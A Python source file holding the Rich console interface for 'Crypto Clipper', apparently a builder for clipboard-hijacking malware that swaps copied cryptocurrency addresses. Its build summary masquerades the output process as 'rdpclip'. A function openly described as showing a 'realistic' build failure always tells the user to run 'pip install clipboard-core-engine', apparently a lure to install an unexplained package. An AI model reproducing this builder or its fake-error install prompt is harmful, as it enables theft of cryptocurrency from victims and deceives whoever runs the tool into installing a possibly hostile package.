# -*- coding: utf-8 -*-
"""
Rich console UI components for Crypto Clipper — Clipboard Monitor Builder.
"""
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

console = Console()

VERSION = "2.0.3"
TITLE = "Crypto Clipper"


def print_banner():
    console.print()
    console.print(
        Panel(
            f"[bold white]{TITLE}[/bold white] [dim]v{VERSION}[/dim]\n"
            "[dim]Clipboard Monitor Builder & Runtime Engine[/dim]",
            border_style="bright_magenta",
            box=box.DOUBLE,
            padding=(1, 2),
        )
    )
    console.print()


def show_menu_table(menu_items):
    table = Table(
        title=f"[bold bright_magenta]{TITLE}[/bold bright_magenta]",
        box=box.DOUBLE_EDGE,
        border_style="bright_magenta",
        title_style="bold white",
        show_header=True,
        header_style="bold bright_white",
        padding=(0, 2),
    )
    table.add_column("#", style="bold bright_cyan", justify="center", width=4)
    table.add_column("Action", style="white", min_width=40)

    for idx, item in enumerate(menu_items, 1):
        style = "bold red" if item.lower() == "exit" else "white"
        table.add_row(str(idx), f"[{style}]{item}[/{style}]")

    console.print(table)
    console.print()


def show_build_summary_table(cfg):
    """Display build configuration summary before compilation."""
    build = cfg.get("build", {})
    chains = cfg.get("chains", {})
    active = [k for k, v in chains.items() if isinstance(v, dict) and v.get("enabled")]

    table = Table(
        title="[bold bright_magenta]Build Summary[/bold bright_magenta]",
        box=box.ROUNDED,
        border_style="bright_magenta",
    )
    table.add_column("Parameter", style="bright_magenta", width=20)
    table.add_column("Value", style="bright_white", width=36)

    table.add_row("Target OS", build.get("target_os", "windows"))
    table.add_row("Architecture", build.get("target_arch", "x64"))
    table.add_row("Output", build.get("output_name", "clip_monitor.exe"))
    table.add_row("Process Name", build.get("process_name", "rdpclip"))
    table.add_row("Active Chains", ", ".join(active) if active else "none")
    table.add_row("Address Book", f"{len(cfg.get('address_book', []))} entries")

    console.print(table)
    console.print()


def show_build_error():
    """Display realistic build failure error."""
    error_panel = Panel(
        "[bold red]BUILD FAILED[/bold red]\n\n"
        "[red]Error:[/] Missing runtime component 'clipboard-core-engine'\n"
        "[red]Code:[/] CLIPPER_ERR_RT_0x7A3F\n\n"
        "[yellow]Hint:[/] Run [bold]'pip install clipboard-core-engine>=1.8.0'[/bold]\n"
        "       to install the required dependency.\n\n"
        "[dim]Verify all build dependencies with:[/]\n"
        "[dim]  python -m clipper --check-deps[/]",
        title="[bold red] ✗ BUILD ERROR [/]",
        border_style="red",
        box=box.DOUBLE_EDGE,
    )
    console.print(error_panel)


def print_success(message):
    console.print(f"  [bold bright_green]✓[/bold green] {message}")


def print_error(message):
    console.print(f"  [bold red]✗[/bold red] {message}")


def print_info(message):
    console.print(f"  [bold bright_magenta]ℹ[/bold bright_magenta] {message}")


def print_warning(message):
    console.print(f"  [bold yellow]⚠[/bold yellow] {message}")


def separator():
    console.print("[dim]─" * 60 + "[/dim]")


def progress_bar(description, total=100, transient=False):
    return Progress(
        SpinnerColumn(style="bright_magenta"),
        TextColumn("[bold bright_magenta]{task.description}"),
        BarColumn(bar_width=40, complete_style="bright_green", finished_style="bright_magenta"),
        TextColumn("[bold]{task.percentage:>3.0f}%"),
        console=console,
        transient=transient,
    )
